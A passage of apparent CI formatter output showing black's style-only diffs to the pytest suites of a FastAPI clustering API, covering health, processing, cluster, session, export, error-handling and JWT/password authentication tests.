+        cpu_efficiency = metrics.throughput_ops_per_second / max(
+            metrics.cpu_usage_percent, 1
+        )
+        assert (
+            cpu_efficiency > 0.1
+        )  # At least 0.1 operations per second per CPU percent
+
 
 def generate_performance_report(results: List[PerformanceMetrics]) -> str:
     """Generate a comprehensive performance report."""
     report = ["Performance Test Report", "=" * 50, ""]
-    
+
     for metrics in results:
-        report.extend([
-            f"Test: {metrics.operation_name}",
-            f"  Operations: {metrics.total_operations}",
-            f"  Duration: {metrics.total_duration_seconds:.2f}s",
-            f"  Throughput: {metrics.throughput_ops_per_second:.1f} ops/sec",
-            f"  Success Rate: {metrics.success_rate:.3f}",
-            f"  Latency P95: {metrics.latency_percentiles.get('p95', 0):.1f}ms",
-            f"  Memory Usage: {metrics.memory_usage_mb:.1f}MB",
-            f"  CPU Usage: {metrics.cpu_usage_percent:.1f}%",
-            ""
-        ])
-    
+        report.extend(
+            [
+                f"Test: {metrics.operation_name}",
+                f"  Operations: {metrics.total_operations}",
+                f"  Duration: {metrics.total_duration_seconds:.2f}s",
+                f"  Throughput: {metrics.throughput_ops_per_second:.1f} ops/sec",
+                f"  Success Rate: {metrics.success_rate:.3f}",
+                f"  Latency P95: {metrics.latency_percentiles.get('p95', 0):.1f}ms",
+                f"  Memory Usage: {metrics.memory_usage_mb:.1f}MB",
+                f"  CPU Usage: {metrics.cpu_usage_percent:.1f}%",
+                "",
+            ]
+        )
+
     return "\n".join(report)
+
 
 if __name__ == "__main__":
     """Run performance tests standalone."""
     print("NeuroCluster Streamer API Performance Tests")
-    print("Note: Run with pytest for full test suite integration")
\ No newline at end of file
+    print("Note: Run with pytest for full test suite integration")
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_api.py	2025-06-10 20:31:25.485857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_api.py	2025-06-10 20:32:37.217614+00:00
@@ -18,625 +18,617 @@
 from fastapi.testclient import TestClient
 from unittest.mock import patch, MagicMock
 
 from . import SAMPLE_DATA_POINTS, SAMPLE_CLUSTERING_CONFIG, API_ENDPOINTS
 
+
 class TestHealthEndpoints:
     """Test health check and status endpoints."""
-    
+
     def test_basic_health_check(self, test_client: TestClient):
         """Test basic health endpoint."""
         response = test_client.get(API_ENDPOINTS["health"])
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "status" in data
         assert "timestamp" in data
         assert "version" in data
         assert data["status"] in ["healthy", "degraded", "unhealthy"]
-    
+
     def test_detailed_health_check(self, test_client: TestClient):
         """Test detailed health endpoint with component checks."""
         response = test_client.get("/health/detailed")
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "overall_status" in data
         assert "components" in data
         assert "timestamp" in data
-        
+
         # Check component health data
         components = data["components"]
         expected_components = ["database", "algorithm", "system_resources"]
-        
+
         for component in expected_components:
             if component in components:
                 assert "status" in components[component]
                 assert "duration_ms" in components[component]
-    
+
     def test_health_check_with_unhealthy_component(self, test_client: TestClient):
         """Test health check when components are unhealthy."""
-        with patch('monitoring.health.get_health_checker') as mock_health:
+        with patch("monitoring.health.get_health_checker") as mock_health:
             mock_checker = MagicMock()
             mock_checker.check_health.return_value = {
                 "status": "unhealthy",
                 "message": "Database connection failed",
                 "checks": {
-                    "database": {
-                        "status": "unhealthy",
-                        "message": "Connection timeout"
-                    }
-                }
+                    "database": {"status": "unhealthy", "message": "Connection timeout"}
+                },
             }
             mock_health.return_value = mock_checker
-            
+
             response = test_client.get(API_ENDPOINTS["health"])
-            
+
             # Should still return 200 but with unhealthy status
             assert response.status_code == 200
             data = response.json()
             assert data["status"] == "unhealthy"
 
+
 class TestProcessingEndpoints:
     """Test data processing endpoints."""
-    
-    def test_process_single_point_success(self, test_client: TestClient, user_headers: Dict):
+
+    def test_process_single_point_success(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test successful single point processing."""
         point_data = {
             "point_id": "test_point_1",
             "features": [1.0, 2.0, 3.0],
-            "session_id": str(uuid.uuid4())
+            "session_id": str(uuid.uuid4()),
         }
-        
-        response = test_client.post(
-            API_ENDPOINTS["process_point"],
-            json=point_data,
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        response = test_client.post(
+            API_ENDPOINTS["process_point"], json=point_data, headers=user_headers
+        )
+
+        assert response.status_code == 200
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_api.py
+        data = response.json()
+
         assert data["success"] is True
         assert "result" in data
         assert "processing_time_ms" in data["result"]
         assert "cluster_id" in data["result"]
         assert "confidence" in data["result"]
-    
-    def test_process_single_point_invalid_data(self, test_client: TestClient, user_headers: Dict):
+
+    def test_process_single_point_invalid_data(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test single point processing with invalid data."""
         invalid_data = {
             "point_id": "",  # Invalid empty ID
             "features": [],  # Invalid empty features
-            "session_id": "invalid_uuid"  # Invalid UUID
+            "session_id": "invalid_uuid",  # Invalid UUID
         }
-        
-        response = test_client.post(
-            API_ENDPOINTS["process_point"],
-            json=invalid_data,
-            headers=user_headers
-        )
-        
+
+        response = test_client.post(
+            API_ENDPOINTS["process_point"], json=invalid_data, headers=user_headers
+        )
+
         assert response.status_code == 422  # Validation error
-    
+
     def test_process_single_point_missing_auth(self, test_client: TestClient):
         """Test single point processing without authentication."""
         point_data = {
             "point_id": "test_point_1",
             "features": [1.0, 2.0, 3.0],
-            "session_id": str(uuid.uuid4())
+            "session_id": str(uuid.uuid4()),
         }
-        
-        response = test_client.post(
-            API_ENDPOINTS["process_point"],
-            json=point_data
-        )
-        
+
+        response = test_client.post(API_ENDPOINTS["process_point"], json=point_data)
+
         assert response.status_code == 401  # Unauthorized
-    
+
     def test_process_batch_success(self, test_client: TestClient, user_headers: Dict):
         """Test successful batch processing."""
         session_id = str(uuid.uuid4())
         batch_data = {
             "session_id": session_id,
             "data_points": SAMPLE_DATA_POINTS,
-            "clustering_config": SAMPLE_CLUSTERING_CONFIG
+            "clustering_config": SAMPLE_CLUSTERING_CONFIG,
         }
-        
-        response = test_client.post(
-            API_ENDPOINTS["process_batch"],
-            json=batch_data,
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        response = test_client.post(
+            API_ENDPOINTS["process_batch"], json=batch_data, headers=user_headers
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert data["success"] is True
         assert "session_id" in data
         assert "results" in data
         assert len(data["results"]) == len(SAMPLE_DATA_POINTS)
-        
+
         # Check each result
         for result in data["results"]:
             assert "point_id" in result
             assert "cluster_id" in result
             assert "confidence" in result
             assert "processing_time_ms" in result
-    
-    def test_process_batch_large_dataset(self, test_client: TestClient, user_headers: Dict, large_data_batch):
+
+    def test_process_batch_large_dataset(
+        self, test_client: TestClient, user_headers: Dict, large_data_batch
+    ):
         """Test batch processing with large dataset."""
         session_id = str(uuid.uuid4())
         batch_data = {
             "session_id": session_id,
             "data_points": large_data_batch[:100],  # Limit for test performance
-            "clustering_config": SAMPLE_CLUSTERING_CONFIG
+            "clustering_config": SAMPLE_CLUSTERING_CONFIG,
         }
-        
+
         start_time = time.time()
         response = test_client.post(
-            API_ENDPOINTS["process_batch"],
-            json=batch_data,
-            headers=user_headers
+            API_ENDPOINTS["process_batch"], json=batch_data, headers=user_headers
         )
         processing_time = time.time() - start_time
-        
+
         assert response.status_code == 200
         assert processing_time < 30  # Should complete within 30 seconds
-        
+
         data = response.json()
         assert len(data["results"]) == 100
-    
-    def test_process_batch_concurrent_sessions(self, test_client: TestClient, user_headers: Dict):
+
+    def test_process_batch_concurrent_sessions(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test concurrent batch processing for different sessions."""
         import threading
-        
+
         results = []
-        
+
         def process_batch(session_num):
             session_id = str(uuid.uuid4())
             batch_data = {
                 "session_id": session_id,
                 "data_points": SAMPLE_DATA_POINTS,
-                "clustering_config": SAMPLE_CLUSTERING_CONFIG
+                "clustering_config": SAMPLE_CLUSTERING_CONFIG,
             }
-            
+
             response = test_client.post(
-                API_ENDPOINTS["process_batch"],
-                json=batch_data,
-                headers=user_headers
+                API_ENDPOINTS["process_batch"], json=batch_data, headers=user_headers
             )
             results.append((session_num, response.status_code, response.json()))
-        
+
         # Run 3 concurrent sessions
         threads = []
         for i in range(3):
             thread = threading.Thread(target=process_batch, args=(i,))
             threads.append(thread)
             thread.start()
-        
+
         # Wait for all threads to complete
         for thread in threads:
             thread.join()
-        
+
         # Verify all sessions succeeded
         assert len(results) == 3
         for session_num, status_code, data in results:
             assert status_code == 200
             assert data["success"] is True
-    
-    def test_process_batch_algorithm_error(self, test_client: TestClient, user_headers: Dict, simulate_algorithm_error):
+
+    def test_process_batch_algorithm_error(
+        self, test_client: TestClient, user_headers: Dict, simulate_algorithm_error
+    ):
         """Test batch processing with algorithm error."""
-        with patch('app.dependencies.get_algorithm_instance') as mock_algo:
+        with patch("app.dependencies.get_algorithm_instance") as mock_algo:
             mock_instance = MagicMock()
             mock_instance.process_point.side_effect = simulate_algorithm_error
             mock_algo.return_value = mock_instance
-            
+
             batch_data = {
                 "session_id": str(uuid.uuid4()),
                 "data_points": SAMPLE_DATA_POINTS[:1],  # Single point to trigger error
-                "clustering_config": SAMPLE_CLUSTERING_CONFIG
+                "clustering_config": SAMPLE_CLUSTERING_CONFIG,
             }
-            
+
             response = test_client.post(
-                API_ENDPOINTS["process_batch"],
-                json=batch_data,
-                headers=user_headers
+                API_ENDPOINTS["process_batch"], json=batch_data, headers=user_headers
             )
-            
+
             assert response.status_code == 500
             data = response.json()
             assert data["success"] is False
             assert "error" in data
 
+
 class TestClusterEndpoints:
     """Test cluster management endpoints."""
-    
-    def test_get_clusters_success(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_get_clusters_success(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test successful cluster retrieval."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.get(
-            f"/clusters?session_id={session_id}",
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        response = test_client.get(
+            f"/clusters?session_id={session_id}", headers=user_headers
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "clusters" in data
         assert len(data["clusters"]) >= 1
-        
+
         # Check cluster structure
         cluster = data["clusters"][0]
         assert "id" in cluster
         assert "centroid" in cluster
         assert "size" in cluster
         assert "health" in cluster
-    
-    def test_get_clusters_pagination(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_get_clusters_pagination(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test cluster retrieval with pagination."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.get(
-            f"/clusters?session_id={session_id}&skip=0&limit=2",
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        response = test_client.get(
+            f"/clusters?session_id={session_id}&skip=0&limit=2", headers=user_headers
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "clusters" in data
         assert "pagination" in data
         assert data["pagination"]["skip"] == 0
         assert data["pagination"]["limit"] == 2
-    
-    def test_get_cluster_details(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_get_cluster_details(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test detailed cluster information retrieval."""
         cluster_id = seed_test_data["cluster"].id
-        
-        response = test_client.get(
-            f"/clusters/{cluster_id}",
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        response = test_client.get(f"/clusters/{cluster_id}", headers=user_headers)
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "cluster" in data
         cluster = data["cluster"]
         assert cluster["id"] == str(cluster_id)
         assert "statistics" in cluster
         assert "data_points" in cluster
-    
+
     def test_get_cluster_not_found(self, test_client: TestClient, user_headers: Dict):
         """Test cluster retrieval with invalid ID."""
         invalid_id = str(uuid.uuid4())
-        
-        response = test_client.get(
-            f"/clusters/{invalid_id}",
-            headers=user_headers
-        )
-        
+
+        response = test_client.get(f"/clusters/{invalid_id}", headers=user_headers)
+
         assert response.status_code == 404
-    
+
     def test_get_clusters_unauthorized(self, test_client: TestClient):
         """Test cluster retrieval without authentication."""
         response = test_client.get("/clusters")
-        
+
         assert response.status_code == 401
+
 
 class TestSessionEndpoints:
     """Test session management endpoints."""
-    
-    def test_get_session_success(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_get_session_success(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test successful session retrieval."""
         session_id = seed_test_data["session"].id
-        
+
         response = test_client.get(
             API_ENDPOINTS["get_session"].format(session_id=session_id),
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+            headers=user_headers,
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "session" in data
         session = data["session"]
         assert session["id"] == str(session_id)
         assert "statistics" in data
         assert "clusters" in data
-    
+
     def test_get_session_not_found(self, test_client: TestClient, user_headers: Dict):
         """Test session retrieval with invalid ID."""
         invalid_id = str(uuid.uuid4())
-        
+
         response = test_client.get(
             API_ENDPOINTS["get_session"].format(session_id=invalid_id),
-            headers=user_headers
-        )
-        
+            headers=user_headers,
+        )
+
         assert response.status_code == 404
-    
-    def test_delete_session_success(self, test_client: TestClient, admin_headers: Dict, seed_test_data):
+
+    def test_delete_session_success(
+        self, test_client: TestClient, admin_headers: Dict, seed_test_data
+    ):
         """Test successful session deletion."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.delete(
-            f"/session/{session_id}",
-            headers=admin_headers
-        )
-        
+
+        response = test_client.delete(f"/session/{session_id}", headers=admin_headers)
+
         assert response.status_code == 200
         data = response.json()
         assert data["success"] is True
-    
-    def test_delete_session_insufficient_permissions(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_delete_session_insufficient_permissions(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test session deletion with insufficient permissions."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.delete(
-            f"/session/{session_id}",
-            headers=user_headers
-        )
-        
+
+        response = test_client.delete(f"/session/{session_id}", headers=user_headers)
+
         assert response.status_code == 403  # Forbidden
+
 
 class TestStatisticsEndpoints:
     """Test statistics and metrics endpoints."""
-    
-    def test_get_statistics_success(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_get_statistics_success(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test successful statistics retrieval."""
         session_id = seed_test_data["session"].id
-        
+
         response = test_client.get(
             f"{API_ENDPOINTS['get_statistics']}?session_id={session_id}",
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+            headers=user_headers,
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "statistics" in data
         stats = data["statistics"]
         assert "total_points" in stats
         assert "active_clusters" in stats
         assert "processing_performance" in stats
-    
+
     def test_get_global_statistics(self, test_client: TestClient, admin_headers: Dict):
         """Test global statistics retrieval."""
         response = test_client.get(
-            API_ENDPOINTS["get_statistics"],
-            headers=admin_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+            API_ENDPOINTS["get_statistics"], headers=admin_headers
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "statistics" in data
         assert "global_metrics" in data["statistics"]
-    
-    def test_get_metrics_prometheus_format(self, test_client: TestClient, admin_headers: Dict):
+
+    def test_get_metrics_prometheus_format(
+        self, test_client: TestClient, admin_headers: Dict
+    ):
         """Test metrics endpoint in Prometheus format."""
-        response = test_client.get(
-            API_ENDPOINTS["get_metrics"],
-            headers=admin_headers
-        )
-        
+        response = test_client.get(API_ENDPOINTS["get_metrics"], headers=admin_headers)
+
         assert response.status_code == 200
         assert response.headers["content-type"] == "text/plain; charset=utf-8"
-        
+
         # Check for Prometheus metrics format
         content = response.text
         assert "# HELP" in content or "# TYPE" in content
 
+
 class TestDataExportEndpoints:
     """Test data export endpoints."""
-    
-    def test_export_session_data_csv(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_export_session_data_csv(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test session data export in CSV format."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.get(
-            f"/export/session/{session_id}?format=csv",
-            headers=user_headers
-        )
-        
+
+        response = test_client.get(
+            f"/export/session/{session_id}?format=csv", headers=user_headers
+        )
+
         assert response.status_code == 200
         assert "text/csv" in response.headers["content-type"]
-        
+
         # Check CSV content
         content = response.text
         assert "point_id" in content
         assert "features" in content
         assert "cluster_id" in content
-    
-    def test_export_session_data_json(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_export_session_data_json(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test session data export in JSON format."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.get(
-            f"/export/session/{session_id}?format=json",
-            headers=user_headers
-        )
-        
+
+        response = test_client.get(
+            f"/export/session/{session_id}?format=json", headers=user_headers
+        )
+
         assert response.status_code == 200
         assert response.headers["content-type"] == "application/json"
-        
+
         data = response.json()
         assert "session_info" in data
         assert "data_points" in data
         assert "clusters" in data
-    
-    def test_export_clusters_only(self, test_client: TestClient, user_headers: Dict, seed_test_data):
+
+    def test_export_clusters_only(
+        self, test_client: TestClient, user_headers: Dict, seed_test_data
+    ):
         """Test exporting only cluster information."""
         session_id = seed_test_data["session"].id
-        
-        response = test_client.get(
-            f"/export/clusters/{session_id}",
-            headers=user_headers
-        )
-        
-        assert response.status_code == 200
-        data = response.json()
-        
+
+        response = test_client.get(
+            f"/export/clusters/{session_id}", headers=user_headers
+        )
+
+        assert response.status_code == 200
+        data = response.json()
+
         assert "clusters" in data
         assert "cluster_statistics" in data
 
+
 class TestErrorHandling:
     """Test API error handling."""
-    
+
     def test_invalid_json_payload(self, test_client: TestClient, user_headers: Dict):
         """Test handling of invalid JSON payload."""
         response = test_client.post(
             API_ENDPOINTS["process_point"],
             data="invalid json",
-            headers={**user_headers, "Content-Type": "application/json"}
-        )
-        
+            headers={**user_headers, "Content-Type": "application/json"},
+        )
+
         assert response.status_code == 422
-    
+
     def test_missing_required_fields(self, test_client: TestClient, user_headers: Dict):
         """Test handling of missing required fields."""
         incomplete_data = {
             "point_id": "test_point"
             # Missing features and session_id
         }
-        
-        response = test_client.post(
-            API_ENDPOINTS["process_point"],
-            json=incomplete_data,
-            headers=user_headers
-        )
-        
+
+        response = test_client.post(
+            API_ENDPOINTS["process_point"], json=incomplete_data, headers=user_headers
+        )
+
         assert response.status_code == 422
         data = response.json()
         assert "detail" in data
-    
-    def test_database_error_handling(self, test_client: TestClient, user_headers: Dict, simulate_database_error):
+
+    def test_database_error_handling(
+        self, test_client: TestClient, user_headers: Dict, simulate_database_error
+    ):
         """Test handling of database errors."""
-        with patch('database.crud.session_crud.create') as mock_create:
+        with patch("database.crud.session_crud.create") as mock_create:
             mock_create.side_effect = simulate_database_error
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json={
                     "point_id": "test_point",
                     "features": [1.0, 2.0, 3.0],
-                    "session_id": str(uuid.uuid4())
+                    "session_id": str(uuid.uuid4()),
                 },
-                headers=user_headers
+                headers=user_headers,
             )
-            
+
             assert response.status_code == 500
             data = response.json()
             assert data["success"] is False
-    
+
     def test_rate_limiting(self, test_client: TestClient, user_headers: Dict):
         """Test API rate limiting."""
         # Make many rapid requests
         responses = []
         for i in range(50):  # Exceed typical rate limit
-            response = test_client.get(
-                API_ENDPOINTS["health"],
-                headers=user_headers
-            )
+            response = test_client.get(API_ENDPOINTS["health"], headers=user_headers)
             responses.append(response.status_code)
-        
+
         # Should eventually get rate limited
         assert 429 in responses  # Too Many Requests
-    
+
     def test_request_timeout(self, test_client: TestClient, user_headers: Dict):
         """Test request timeout handling."""
-        with patch('NCS_V8.NCSClusteringAlgorithm.process_point') as mock_process:
+        with patch("NCS_V8.NCSClusteringAlgorithm.process_point") as mock_process:
             # Simulate slow processing
             import time
+
             def slow_process(*args, **kwargs):
                 time.sleep(10)  # Longer than timeout
                 return {"cluster_id": "test"}
-            
+
             mock_process.side_effect = slow_process
-            
+
             response = test_client.post(
                 API_ENDPOINTS["process_point"],
                 json={
                     "point_id": "test_point",
                     "features": [1.0, 2.0, 3.0],
-                    "session_id": str(uuid.uuid4())
+                    "session_id": str(uuid.uuid4()),
                 },
                 headers=user_headers,
-                timeout=5  # 5 second timeout
+                timeout=5,  # 5 second timeout
             )
-            
+
             # Should handle timeout gracefully
             assert response.status_code in [408, 500]  # Timeout or Server Error
 
+
 class TestContentNegotiation:
     """Test content negotiation and response formats."""
-    
+
     def test_json_response_default(self, test_client: TestClient, user_headers: Dict):
         """Test default JSON response format."""
-        response = test_client.get(
-            API_ENDPOINTS["health"],
-            headers=user_headers
-        )
-        
+        response = test_client.get(API_ENDPOINTS["health"], headers=user_headers)
+
         assert response.status_code == 200
         assert "application/json" in response.headers["content-type"]
-    
+
     def test_accept_header_json(self, test_client: TestClient, user_headers: Dict):
         """Test JSON response with Accept header."""
         headers = {**user_headers, "Accept": "application/json"}
-        
-        response = test_client.get(
-            API_ENDPOINTS["health"],
-            headers=headers
-        )
-        
+
+        response = test_client.get(API_ENDPOINTS["health"], headers=headers)
+
         assert response.status_code == 200
         assert "application/json" in response.headers["content-type"]
-    
+
     def test_unsupported_media_type(self, test_client: TestClient, user_headers: Dict):
         """Test unsupported media type handling."""
         headers = {**user_headers, "Content-Type": "application/xml"}
-        
-        response = test_client.post(
-            API_ENDPOINTS["process_point"],
-            data="<xml>invalid</xml>",
-            headers=headers
-        )
-        
+
+        response = test_client.post(
+            API_ENDPOINTS["process_point"], data="<xml>invalid</xml>", headers=headers
+        )
+
         assert response.status_code == 415  # Unsupported Media Type
+
 
 @pytest.mark.performance
 class TestPerformanceRequirements:
     """Test API performance requirements."""
-    
+
     def test_health_check_response_time(self, test_client: TestClient):
         """Test health check response time requirement."""
         start_time = time.time()
         response = test_client.get(API_ENDPOINTS["health"])
         response_time = time.time() - start_time
-        
+
         assert response.status_code == 200
         assert response_time < 0.1  # Should respond in under 100ms
-    
-    def test_single_point_processing_time(self, test_client: TestClient, user_headers: Dict):
+
+    def test_single_point_processing_time(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test single point processing time requirement."""
         point_data = {
             "point_id": "perf_test_point",
             "features": [1.0, 2.0, 3.0],
-            "session_id": str(uuid.uuid4())
+            "session_id": str(uuid.uuid4()),
         }
-        
+
         start_time = time.time()
         response = test_client.post(
-            API_ENDPOINTS["process_point"],
-            json=point_data,
-            headers=user_headers
+            API_ENDPOINTS["process_point"], json=point_data, headers=user_headers
         )
         response_time = time.time() - start_time
-        
-        assert response.status_code == 200
-        assert response_time < 1.0  # Should process in under 1 second
\ No newline at end of file
+
+        assert response.status_code == 200
+        assert response_time < 1.0  # Should process in under 1 second
--- /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_auth.py	2025-06-10 20:31:25.485857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/tests/test_auth.py	2025-06-10 20:32:37.295334+00:00
@@ -19,713 +19,652 @@
 from fastapi.testclient import TestClient
 from unittest.mock import patch, MagicMock
 import jwt
 
 from auth import (
-    create_access_token, create_refresh_token, verify_token,
-    hash_password, verify_password, get_current_user
+    create_access_token,
+    create_refresh_token,
+    verify_token,
+    hash_password,
+    verify_password,
+    get_current_user,
 )
 from config import settings
 from . import TEST_USERS, API_ENDPOINTS
 
+
 class TestJWTAuthentication:
     """Test JWT token authentication functionality."""
-    
+
     def test_create_access_token(self):
         """Test JWT access token creation."""
         user_data = {
             "sub": "test_user_123",
             "email": "test@example.com",
             "role": "user",
-            "scopes": ["read", "write"]
-        }
-        
+            "scopes": ["read", "write"],
+        }
+
         token = create_access_token(user_data)
-        
+
         assert isinstance(token, str)
         assert len(token) > 50  # JWT tokens are long
-        
+
         # Verify token can be decoded
         decoded = jwt.decode(
-            token,
-            settings.JWT_SECRET_KEY,
-            algorithms=[settings.JWT_ALGORITHM]
-        )
-        
+            token, settings.JWT_SECRET_KEY, algorithms=[settings.JWT_ALGORITHM]
+        )
+
         assert decoded["sub"] == user_data["sub"]
         assert decoded["email"] == user_data["email"]
         assert decoded["role"] == user_data["role"]
         assert decoded["scopes"] == user_data["scopes"]
         assert "exp" in decoded
         assert "iat" in decoded
-    
+
     def test_create_refresh_token(self):
         """Test JWT refresh token creation."""
-        user_data = {
-            "sub": "test_user_123",
-            "email": "test@example.com"
-        }
-        
+        user_data = {"sub": "test_user_123", "email": "test@example.com"}
+
         token = create_refresh_token(user_data)
-        
+
         assert isinstance(token, str)
-        
+
         # Verify token
         decoded = jwt.decode(
-            token,
-            settings.JWT_SECRET_KEY,
-            algorithms=[settings.JWT_ALGORITHM]
-        )
-        
+            token, settings.JWT_SECRET_KEY, algorithms=[settings.JWT_ALGORITHM]
+        )
+
         assert decoded["sub"] == user_data["sub"]
         assert decoded["token_type"] == "refresh"
-    
+
     def test_verify_valid_token(self):
         """Test verification of valid JWT token."""
         user_data = {
             "sub": "test_user_123",
             "email": "test@example.com",
             "role": "user",
-            "scopes": ["read", "write"]
-        }
-        
+            "scopes": ["read", "write"],
+        }
+
         token = create_access_token(user_data)
         verified_data = verify_token(token)
-        
+
         assert verified_data is not None
         assert verified_data["sub"] == user_data["sub"]
         assert verified_data["email"] == user_data["email"]
-    
+
     def test_verify_expired_token(self):
         """Test verification of expired JWT token."""
         user_data = {
             "sub": "test_user_123",
             "email": "test@example.com",
-            "role": "user"
-        }
-        
+            "role": "user",
+        }
+
         # Create token with very short expiration
-        expired_token = create_access_token(user_data, expires_delta=timedelta(seconds=-1))
-        
+        expired_token = create_access_token(
+            user_data, expires_delta=timedelta(seconds=-1)
+        )
+
         # Should return None for expired token
         verified_data = verify_token(expired_token)
         assert verified_data is None
-    
+
     def test_verify_invalid_signature(self):
         """Test verification of token with invalid signature."""
-        user_data = {
-            "sub": "test_user_123",
-            "email": "test@example.com"
-        }
-        
+        user_data = {"sub": "test_user_123", "email": "test@example.com"}
+
         # Create token with different secret
         invalid_token = jwt.encode(
-            user_data,
-            "wrong_secret_key",
-            algorithm=settings.JWT_ALGORITHM
-        )
-        
+            user_data, "wrong_secret_key", algorithm=settings.JWT_ALGORITHM
+        )
+
         # Should return None for invalid signature
         verified_data = verify_token(invalid_token)
         assert verified_data is None
-    
+
     def test_verify_malformed_token(self):
         """Test verification of malformed JWT token."""
-        malformed_tokens = [
-            "not.a.jwt.token",
-            "invalid_token",
-            "",
-            None
-        ]
-        
+        malformed_tokens = ["not.a.jwt.token", "invalid_token", "", None]
+
         for token in malformed_tokens:
             verified_data = verify_token(token)
             assert verified_data is None
 
+
 class TestPasswordHashing:
     """Test password hashing and verification."""
-    
+
     def test_hash_password(self):
         """Test password hashing."""
         password = "test_password_123"
         hashed = hash_password(password)
-        
+
         assert isinstance(hashed, str)
         assert hashed != password  # Should be hashed
         assert len(hashed) > 50  # Bcrypt hashes are long
         assert hashed.startswith("$2b$")  # Bcrypt format
-    
+
     def test_verify_correct_password(self):
         """Test verification of correct password."""
         password = "test_password_123"
         hashed = hash_password(password)
-        
+
         assert verify_password(password, hashed) is True
-    
+
     def test_verify_incorrect_password(self):
         """Test verification of incorrect password."""
         password = "test_password_123"
         wrong_password = "wrong_password"
         hashed = hash_password(password)
-        
+
         assert verify_password(wrong_password, hashed) is False
-    
+
     def test_verify_empty_password(self):
         """Test verification with empty password."""
         hashed = hash_password("test_password")
-        
+
         assert verify_password("", hashed) is False
         assert verify_password(None, hashed) is False
 
+
 class TestAuthenticationEndpoints:
     """Test authentication endpoints."""
-    
+
     def test_login_success(self, test_client: TestClient):
         """Test successful login."""
         login_data = {
             "username": TEST_USERS["user"]["email"],
-            "password": TEST_USERS["user"]["password"]
-        }
-        
-        with patch('auth.authenticate_user') as mock_auth:
+            "password": TEST_USERS["user"]["password"],
+        }
+
+        with patch("auth.authenticate_user") as mock_auth:
             mock_auth.return_value = {
                 "user_id": TEST_USERS["user"]["user_id"],
                 "email": TEST_USERS["user"]["email"],
                 "role": TEST_USERS["user"]["role"],
-                "scopes": TEST_USERS["user"]["scopes"]
+                "scopes": TEST_USERS["user"]["scopes"],
             }
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-        
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
         assert response.status_code == 200
         data = response.json()
-        
+
         assert "access_token" in data
         assert "refresh_token" in data
         assert "token_type" in data
         assert data["token_type"] == "bearer"
         assert "expires_in" in data
-    
+
     def test_login_invalid_credentials(self, test_client: TestClient):
         """Test login with invalid credentials."""
-        login_data = {
-            "username": "invalid@example.com",
-            "password": "wrong_password"
-        }
-        
-        with patch('auth.authenticate_user') as mock_auth:
+        login_data = {"username": "invalid@example.com", "password": "wrong_password"}
+
+        with patch("auth.authenticate_user") as mock_auth:
             mock_auth.return_value = None  # Failed authentication
-            
-            response = test_client.post(
-                API_ENDPOINTS["auth_login"],
-                data=login_data
-            )
-        
+
+            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)
+
         assert response.status_code == 401
         data = response.json()
         assert "detail" in data
         assert "access_token" not in data
-    
+
     def test_login_missing_credentials(self, test_client: TestClient):
         """Test login with missing credentials."""
         incomplete_data = {
             "username": "test@example.com"
             # Missing password
         }
-        
-        response = test_client.post(
-            API_ENDPOINTS["auth_login"],
-            data=incomplete_data
-        )
-        
+
